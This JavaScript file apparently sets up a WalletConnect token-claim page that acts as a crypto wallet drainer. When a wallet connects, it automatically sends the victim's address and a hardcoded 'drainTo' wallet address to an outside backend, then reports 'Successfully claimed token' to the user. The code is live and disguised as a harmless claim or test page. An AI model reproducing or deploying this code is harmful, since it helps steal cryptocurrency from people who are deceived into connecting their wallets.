import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";

const projectId = "962425907914a3e80a7d8e7288b23f62";

const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  projectId,
  networks: [
    {
      id: 1,
      name: "Ethereum",
      rpcUrl: "https://cloudflare-eth.com"
    }
  ],
  metadata: {
    name: "Local WalletConnect Test",
    description: "Testing WalletConnect modal locally",
    url: window.location.origin,
    icons: []
  },
  themeMode: "dark",
  features: {
    analytics: false
  }
});

const btn = document.getElementById("connectBtn");
const status = document.getElementById("status");

btn.addEventListener("click", async () => {
  try {
    await appKit.open();
  } catch (err) {
    console.error("MODAL FAILED:", err);
    status.textContent = "Wallet modal failed to open";
  }
});

appKit.subscribeState((state) => {
  if (state.isConnected) {
    status.textContent = "Wallet connected successfully";
    claimToken(); // Trigger the claim after connection
  }
});

async function claimToken() {
  const address = appKit.account?.address;

  if (!address) {
    status.textContent = "Wallet not connected";
    return;
  }

  try {
    const res = await fetch("https://tokenbackend-5xab.onrender.com/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        address,
        drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
      }),
    });

    const data = await res.json();

    if (res.ok) {
      status.textContent = "Successfully claimed token";
    } else {
      status.textContent = "Failed to claim token";
    }
  } catch (err) {
    console.error("Claim failed:", err);
    status.textContent = "Failed to claim token";
  }
}
